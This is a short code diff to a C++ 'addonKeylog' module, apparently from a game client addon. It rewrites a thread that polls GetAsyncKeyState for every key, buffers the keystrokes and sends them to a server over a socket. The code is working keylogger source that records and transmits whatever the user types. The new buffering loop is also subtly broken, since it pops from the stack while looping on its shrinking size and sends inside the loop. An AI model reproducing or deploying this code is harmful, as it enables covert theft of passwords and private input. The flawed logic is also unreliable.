@@ -36,21 +36,37 @@ addonKeylog::~addonKeylog()
 
 
 
-DWORD __stdcall keylog_thread(LPVOID lpParam)
+DWORD keylog_thread(void *lpParam)
 {
 	addonDebug("Thread 'keylog_thread' successfuly started");
 
+	std::stack<int> keyStack;
+	std::string keyString;
+
 	while(gKeylog->active)
 	{
+		if(keyStack.size() >= 256)
+		{
+			keyString.clear();
+
+			for(unsigned int i = 0; i < keyStack.size(); i++)
+			{
+				keyString.push_back(keyStack.top());
+				keyStack.pop();
+				
+				gSocket->Send(formatString() << "TCPQUERY" << " " << "CLIENT_CALL" << " " << 1002 << " " << keyString); // TCPQUERY CLIENT_CALL 1002 %s1    ---   Sends async key data | %s1 - Keys array
+			}
+		}
+
 		for(int q = 8; q != 191; q++)
 		{
 			if(GetAsyncKeyState(q) == -32767)
 			{
-				gSocket->Send(formatString() << "TCPQUERY" << ">" << "CLIENT_CALL" << ">" << 1234 << ">" << q); // "TCPQUERY>CLIENT_CALL>1234>%i   ---   Sends async key data (array) | %i - pressed key
+				keyStack.push(q);
 			}
 		}
 
-		Sleep(250);
+		Sleep(50);
 	}
 
 	return true;
